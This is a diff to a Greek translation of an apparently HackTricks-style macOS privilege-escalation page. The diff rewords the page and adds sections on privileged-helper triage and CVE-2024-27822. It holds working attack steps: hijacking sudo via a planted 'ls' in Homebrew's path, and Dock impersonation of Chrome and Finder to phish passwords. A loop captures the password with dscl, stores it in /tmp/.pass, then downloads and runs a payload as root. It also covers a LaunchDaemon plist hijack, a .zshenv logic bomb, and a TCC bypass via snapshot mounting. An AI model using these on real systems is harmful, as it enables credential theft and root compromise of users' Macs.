@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-Αν ήρθατε εδώ αναζητώντας TCC privilege escalation, πηγαίνετε στο:
+Αν αναζητάτε TCC privilege escalation, μεταβείτε εδώ:
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Σημειώστε ότι **τα περισσότερα κόλπα σχετικά με privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης μηχανήματα MacOS**. Επομένως δείτε:
+Σημειώστε ότι **τα περισσότερα tricks σχετικά με privilege escalation που επηρεάζουν Linux/Unix θα επηρεάζουν επίσης** μηχανήματα **MacOS**. Επομένως, δείτε:
 
 
 {{#ref}}
 ../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
-## Αλληλεπίδραση χρήστη
+## User Interaction
 
 ### Sudo Hijacking
 
-Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Μπορείτε να βρείτε την αρχική [τεχνική Sudo Hijacking μέσα στο άρθρο Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
-Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να πραγματοποιήσετε αυτήν την επίθεση είναι να **hijack other binaries** που το θύμα θα εκτελέσει όταν **τρέχει sudo:**
+Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να γίνει **hijack σε άλλα binaries** που το θύμα θα εκτελέσει κατά την **εκτέλεση του sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό είναι πολύ πιθανό να έχει εγκατεστημένο το **Homebrew**. Έτσι είναι δυνατό να υποκλέψετε ή να αντικαταστήσετε εκτελέσιμα στο **`/opt/homebrew/bin`**.
+Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το terminal είναι πολύ πιθανό να έχει **Homebrew installed**. Επομένως, είναι δυνατή η **hijack** binaries στο **`/opt/homebrew/bin`**.
 
-### Προσποίηση Dock
+### Dock Impersonation
 
-Χρησιμοποιώντας κάποια **social engineering** θα μπορούσατε να **προσποιηθείτε, για παράδειγμα, το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:
+Χρησιμοποιώντας **social engineering**, θα μπορούσατε να **impersonate για παράδειγμα το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Μερικές προτάσεις:
 
-- Ελέγξτε στο Dock αν υπάρχει Chrome, και σε αυτή την περίπτωση **αφαιρέστε** εκείνη την εγγραφή και **προσθέστε** την **ψεύτικη** **εγγραφή Chrome στην ίδια θέση** στον πίνακα του Dock.
+- Ελέγξτε στο Dock αν υπάρχει το Chrome και, σε αυτήν την περίπτωση, **αφαιρέστε** αυτήν την καταχώριση και **προσθέστε** την **fake** καταχώριση του **Chrome** στην **ίδια θέση** μέσα στο Dock array.
 
 <details>
 <summary>Chrome Dock impersonation script</summary>
@@ -131,11 +131,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Μερικές προτάσεις:
 
-- Δεν μπορείτε να αφαιρέσετε το **Finder από το Dock**, οπότε αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το ψεύτικο Finder ακριβώς δίπλα στο πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την εγγραφή του ψεύτικου Finder στην αρχή του πίνακα Dock**.
-- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε — "Finder asking to control Finder" δεν είναι τόσο περίεργο.
-- Μια ακόμα επιλογή για να **escalate to root without asking** τον κωδικό με ένα απαίσιο παράθυρο, είναι να κάνετε το Finder να ζητήσει πραγματικά τον κωδικό για να εκτελέσει μια ενέργεια με προνόμια:
-- Ζητήστε από το Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Το prompt που ζητάει τον κωδικό θα υποδεικνύει ότι "Finder wants to copy sudo")
-- Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου ώστε το prompt που ζητάει τον κωδικό να υποδεικνύει ότι "Finder wants to copy Finder.bundle")
+- **Δεν μπορείτε να αφαιρέσετε το Finder από το Dock**, επομένως, αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το ψεύτικο Finder ακριβώς δίπλα στο πραγματικό. Για αυτό, πρέπει να **προσθέσετε την καταχώριση του ψεύτικου Finder στην αρχή του array του Dock**.
+- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε· το «Finder ζητά να ελέγξει το Finder» δεν είναι και τόσο παράξενο.
+- Μια άλλη επιλογή για να **κλιμακώσετε προνόμια σε root χωρίς να ζητήσετε** τον κωδικό πρόσβασης μέσω ενός φρικτού παραθύρου είναι να κάνετε το Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για την εκτέλεση μιας προνομιακής ενέργειας:
+- Ζητήστε από το Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Η προτροπή που ζητά τον κωδικό πρόσβασης θα αναφέρει ότι «το Finder θέλει να αντιγράψει το sudo»)
+- Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου, ώστε η προτροπή που ζητά τον κωδικό πρόσβασης να αναφέρει ότι «το Finder θέλει να αντιγράψει το Finder.bundle»)
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -213,15 +213,15 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### Password prompt phishing + sudo reuse
+### Phishing μέσω προτροπής κωδικού πρόσβασης + επαναχρησιμοποίηση sudo
 
-Malware συχνά καταχράται την αλληλεπίδραση με τον χρήστη για να **συλλάβει ένα συνθηματικό ικανό για sudo** και να το επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:
+Το Malware συχνά εκμεταλλεύεται την αλληλεπίδραση του χρήστη για να **συλλέξει έναν κωδικό πρόσβασης με δυνατότητα sudo** και να τον επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:
 
-1. Εντοπίζει τον συνδεδεμένο χρήστη με `whoami`.
-2. **Επαναλαμβάνει τις προτροπές κωδικού** μέχρι `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
-3. Αποθηκεύει το διαπιστευτήριο (π.χ., `/tmp/.pass`) και εκτελεί ενέργειες με προνόμια με `sudo -S` (ο κωδικός μέσω stdin).
+1. Εντοπισμός του συνδεδεμένου χρήστη με `whoami`.
+2. **Επανάληψη των προτροπών κωδικού πρόσβασης** μέχρι η εντολή `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
+3. Αποθήκευση του credential (π.χ. `/tmp/.pass`) και εκτέλεση privileged ενεργειών με `sudo -S` (κωδικός πρόσβασης μέσω stdin).
 
-Example minimal chain:
+Ελάχιστη αλυσίδα παραδείγματος:
 ```bash
 user=$(whoami)
 while true; do
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-Ο κλεμμένος κωδικός μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για να **καθαρίσει την καραντίνα του Gatekeeper με `xattr -c`**, να αντιγράψει LaunchDaemons ή άλλα προνομιούχα αρχεία, και να εκτελέσει επιπλέον στάδια χωρίς αλληλεπίδραση.
+Ο κλεμμένος κωδικός πρόσβασης μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για την **εκκαθάριση του Gatekeeper quarantine με `xattr -c`**, την αντιγραφή LaunchDaemons ή άλλων προνομιούχων αρχείων και την εκτέλεση πρόσθετων σταδίων χωρίς αλληλεπίδραση.
 
-## Νεότερα macOS-specific vectors (2023–2025)
+## Νεότερα vectors ειδικά για macOS (2023–2025)
 
-### Αποσυρμένο `AuthorizationExecuteWithPrivileges` εξακολουθεί να λειτουργεί
+### Το deprecated `AuthorizationExecuteWithPrivileges` παραμένει usable
 
-`AuthorizationExecuteWithPrivileges` αποσυρθεί στο 10.7 αλλά **εξακολουθεί να λειτουργεί σε Sonoma/Sequoia**. Πολλοί εμπορικοί updaters καλούν το `/usr/libexec/security_authtrampoline` με ένα untrusted path. Εάν το target binary είναι user-writable μπορείτε να φυτέψετε ένα trojan και να εκμεταλλευτείτε το legitimate prompt:
+Το `AuthorizationExecuteWithPrivileges` έγινε deprecated στην έκδοση 10.7, αλλά **εξακολουθεί να λειτουργεί στα Sonoma/Sequoia**. Πολλά commercial updaters καλούν το `/usr/libexec/security_authtrampoline` με μια untrusted διαδρομή. Αν το target binary είναι εγγράψιμο από τον χρήστη, μπορείς να τοποθετήσεις ένα trojan και να εκμεταλλευτείς το legitimate prompt:
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -248,11 +248,50 @@ cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
 chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
-Συνδυάστε με τα **masquerading tricks above** για να παρουσιάσετε έναν πειστικό διάλογο κωδικού πρόσβασης.
+Συνδύασέ το με τα **masquerading tricks above** για να παρουσιάσεις έναν πειστικό διάλογο password.
+
+
+### Triage προνομιακού helper / XPC
+
+Πολλά σύγχρονα third-party macOS privescs ακολουθούν το ίδιο μοτίβο: ένα **root LaunchDaemon** εκθέτει μια υπηρεσία **Mach/XPC** από το **`/Library/PrivilegedHelperTools`** και, στη συνέχεια, ο helper είτε **δεν επικυρώνει τον client**, είτε τον επικυρώνει **πολύ αργά** (PID race), είτε εκθέτει μια **root method** που χρησιμοποιεί ένα **user-controlled path/script**. Αυτή είναι η κατηγορία bug που βρίσκεται πίσω από πολλά πρόσφατα bugs σε helpers των VPN clients, game launchers και updaters.
+
+Γρήγορη λίστα ελέγχου triage:
+```bash
+ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
+plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
+for f in /Library/PrivilegedHelperTools/*; do
+echo "== $f =="
+codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
+strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
+done
+```
+Δώστε ιδιαίτερη προσοχή σε helpers που:
+
+- συνεχίζουν να δέχονται requests **μετά το uninstall**, επειδή το job παρέμεινε φορτωμένο στο `launchd`
+- εκτελούν scripts ή διαβάζουν configuration από το **`/Applications/...`** ή άλλες διαδρομές στις οποίες έχουν write access non-root users
+- βασίζονται σε **PID-based** ή **bundle-id-only** peer validation, η οποία μπορεί να γίνει raceable
+
+Για περισσότερες λεπτομέρειες σχετικά με authorization bugs σε helpers, δείτε [αυτή τη σελίδα](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
+
+### PackageKit script environment inheritance (CVE-2024-27822)
+
+Μέχρι η Apple να το διορθώσει στα **Sonoma 14.5**, **Ventura 13.6.7** και **Monterey 12.7.5**, οι εγκαταστάσεις που ξεκινούσε ο χρήστης μέσω των **`Installer.app`** / **`PackageKit.framework`** μπορούσαν να εκτελέσουν **PKG scripts ως root μέσα στο environment του τρέχοντος χρήστη**. Αυτό σημαίνει ότι ένα package που χρησιμοποιεί **`#!/bin/zsh`** θα φόρτωνε το **`~/.zshenv`** του attacker και θα το εκτελούσε ως **root** όταν το θύμα εγκαθιστούσε το package.
+
+Αυτό είναι ιδιαίτερα ενδιαφέρον ως **logic bomb**: χρειάζεστε μόνο ένα foothold στο account του χρήστη και ένα writable shell startup file, και στη συνέχεια περιμένετε να εκτελεστεί από τον χρήστη οποιοσδήποτε ευάλωτος **zsh-based** installer. Αυτό γενικά **δεν** ισχύει για deployments μέσω **MDM/Munki**, επειδή αυτά εκτελούνται μέσα στο environment του root user.
+```bash
+# inspect a vendor pkg for shell-based install scripts
+pkgutil --expand-full Target.pkg /tmp/target-pkg
+find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
+rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
+
+# logic bomb example for vulnerable zsh-based installers
+echo 'id > /tmp/pkg-root' >> ~/.zshenv
+```
+Αν θέλετε μια βαθύτερη ανάλυση της ειδικής κατάχρησης των installers, δείτε επίσης [αυτή τη σελίδα](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
 ### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
 
-Εάν ένα LaunchDaemon plist ή ο στόχος του `ProgramArguments` είναι **user-writable**, μπορείτε να κλιμακώσετε τα προνόμια αντικαθιστώντας το και αναγκάζοντας το launchd να ξαναφορτώσει:
+Αν ένα LaunchDaemon plist ή ο στόχος του `ProgramArguments` είναι **user-writable**, μπορείτε να κάνετε privilege escalation αντικαθιστώντας το και στη συνέχεια εξαναγκάζοντας το launchd να το φορτώσει ξανά:
 ```bash
 sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
 cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
@@ -269,40 +308,40 @@ cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
 PLIST
 sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
 ```
-Αυτό αντικατοπτρίζει το μοτίβο εκμετάλλευσης που δημοσιεύτηκε για **CVE-2025-24085**, όπου ένα writable plist καταχράστηκε για να εκτελέσει κώδικα επιτιθέμενου ως root.
+Αυτό αντικατοπτρίζει το μοτίβο exploit που δημοσιεύτηκε για το **CVE-2025-24085**, όπου ένα εγγράψιμο plist χρησιμοποιήθηκε καταχρηστικά για την εκτέλεση κώδικα του attacker ως root.
 
 ### XNU SMR credential race (CVE-2025-24118)
 
-A **race in `kauth_cred_proc_update`** επιτρέπει σε τοπικό επιτιθέμενο να καταστρέψει τον δείκτη διαπιστευτηρίων μόνο για ανάγνωση (`proc_ro.p_ucred`) ανταγωνιζόμενος τους βρόχους `setgid()`/`getgid()` ανάμεσα σε threads μέχρι να συμβεί ένα torn `memcpy`. Η επιτυχής καταστροφή αποδίδει **uid 0** και πρόσβαση στη μνήμη του kernel. Ελάχιστη δομή PoC:
+Ένα **race στο `kauth_cred_proc_update`** επιτρέπει σε έναν local attacker να αλλοιώσει τον read-only credential pointer (`proc_ro.p_ucred`) εκτελώντας ταυτόχρονα βρόχους `setgid()`/`getgid()` σε πολλαπλά threads, μέχρι να προκύψει ένα torn `memcpy`. Η επιτυχής αλλοίωση παρέχει **uid 0** και πρόσβαση στη μνήμη του kernel. Ελάχιστη δομή PoC:
 ```c
 // thread A
 while (1) setgid(rand());
 // thread B
 while (1) getgid();
 ```
-Συνδυάστε με heap grooming για να τοποθετήσετε ελεγχόμενα δεδομένα όπου ο pointer διαβάζεται ξανά. Σε ευάλωτα builds αυτό είναι ένας αξιόπιστος **local kernel privesc** χωρίς απαίτηση παράκαμψης SIP.
+Σε συνδυασμό με heap grooming, τοποθετήστε ελεγχόμενα δεδομένα στο σημείο όπου γίνεται ξανά ανάγνωση του pointer. Σε ευάλωτα builds, αυτό αποτελεί αξιόπιστο **local kernel privesc** χωρίς απαιτήσεις για SIP bypass.
 
-### Παράκαμψη SIP μέσω Migration assistant ("Migraine", CVE-2023-32369)
+### SIP bypass μέσω του Migration assistant ("Migraine", CVE-2023-32369)
 
-Ακόμα κι αν έχετε ήδη root, το SIP εξακολουθεί να μπλοκάρει εγγραφές σε συστημικές τοποθεσίες. Το bug **Migraine** καταχράται το entitlement του Migration Assistant `com.apple.rootless.install.heritable` για να ξεκινήσει μια child process που κληρονομεί την παράκαμψη SIP και αντικαθιστά προστατευμένα μονοπάτια (π.χ. `/System/Library/LaunchDaemons`). Η αλυσίδα:
+Αν έχετε ήδη root, το SIP εξακολουθεί να αποκλείει τις εγγραφές σε system locations. Το bug **Migraine** εκμεταλλεύεται το entitlement `com.apple.rootless.install.heritable` του Migration Assistant, ώστε να εκκινήσει μια child process που κληρονομεί το SIP bypass και να αντικαταστήσει protected paths (π.χ. `/System/Library/LaunchDaemons`). Η αλυσίδα:
 
-1. Αποκτήστε root σε ένα ζωντανό σύστημα.
-2. Προκαλέστε το `systemmigrationd` με κατασκευασμένη κατάσταση ώστε να εκτελέσει ένα attacker-controlled binary.
-3. Χρησιμοποιήστε το κληρονομημένο entitlement για να τροποποιήσετε SIP-protected αρχεία, που παραμένουν ακόμα και μετά από επανεκκίνηση.
+1. Αποκτήστε root σε ένα live system.
+2. Ενεργοποιήστε το `systemmigrationd` με crafted state, ώστε να εκτελέσει ένα attacker-controlled binary.
+3. Χρησιμοποιήστε το inherited entitlement για να τροποποιήσετε SIP-protected files, διατηρώντας την επίμονη πρόσβαση ακόμη και μετά το reboot.
 
 ### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
 
-Πολλοί Apple daemons δέχονται αντικείμενα **NSPredicate** μέσω XPC και ελέγχουν μόνο το πεδίο `expressionType`, το οποίο είναι ελεγχόμενο από τον attacker. Με τη δημιουργία ενός predicate που αξιολογεί αυθαίρετους selectors μπορείτε να πετύχετε **code execution in root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με αρχική app sandbox escape, αυτό δίνει **privilege escalation χωρίς προτροπές χρήστη**. Αναζητήστε XPC endpoints που απο-σειριοποιούν predicates και στερούνται ενός αξιόπιστου visitor.
+Πολλαπλά Apple daemons αποδέχονται αντικείμενα **NSPredicate** μέσω XPC και επικυρώνουν μόνο το πεδίο `expressionType`, το οποίο ελέγχεται από τον attacker. Κατασκευάζοντας ένα predicate που αξιολογεί arbitrary selectors, μπορείτε να επιτύχετε **code execution σε root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με ένα αρχικό app sandbox escape, αυτό παρέχει **privilege escalation χωρίς user prompts**. Αναζητήστε XPC endpoints που κάνουν deserialize predicates και δεν διαθέτουν robust visitor.
 
 ## TCC - Root Privilege Escalation
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation
 
-**Any user** (ακόμα και μη εξουσιοδοτημένοι) μπορεί να δημιουργήσει και να mount-άρει ένα Time Machine snapshot και να **έχει πρόσβαση ΣΕ ΟΛΑ τα αρχεία** αυτού του snapshot.\
-Το **μόνο privilege** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως `Terminal`) να έχει **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), το οποίο πρέπει να χορηγηθεί από admin.
+**Οποιοσδήποτε user** (ακόμη και unprivileged users) μπορεί να δημιουργήσει και να κάνει mount ένα time machine snapshot και να αποκτήσει πρόσβαση **σε ΟΛΑ τα files** αυτού του snapshot.\
+Το **μόνο privileged στοιχείο** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει πρόσβαση **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να εκχωρηθεί από admin.
 
 <details>
-<summary>Τοποθέτηση στιγμιότυπου Time Machine</summary>
+<summary>Mount Time Machine snapshot</summary>
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -324,11 +363,11 @@ ls /tmp/snap/Users/admin_user # This will work
 ```
 </details>
 
-Μια πιο λεπτομερής εξήγηση μπορείτε να βρείτε στο [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Μια πιο λεπτομερής εξήγηση είναι διαθέσιμη [**στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-## Ευαίσθητες Πληροφορίες
+## Ευαίσθητες πληροφορίες
 
-Αυτό μπορεί να είναι χρήσιμο για κλιμάκωση προνομίων:
+Αυτό μπορεί να είναι χρήσιμο για την κλιμάκωση προνομίων:
 
 
 {{#ref}}
@@ -337,7 +376,9 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## Αναφορές
 
-- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [Παράκαμψη SIP "Migraine" της Microsoft (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [CVE-2025-24118: write-up και PoC για race credential στο SMR](https://github.com/jprx/CVE-2025-24118)
+- [CVE-2024-27822: Privilege Escalation στο macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [CVE-2024-30165: Local Privilege Escalation στο AWS Client VPN για macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 
 {{#include ../../banners/hacktricks-training.md}}
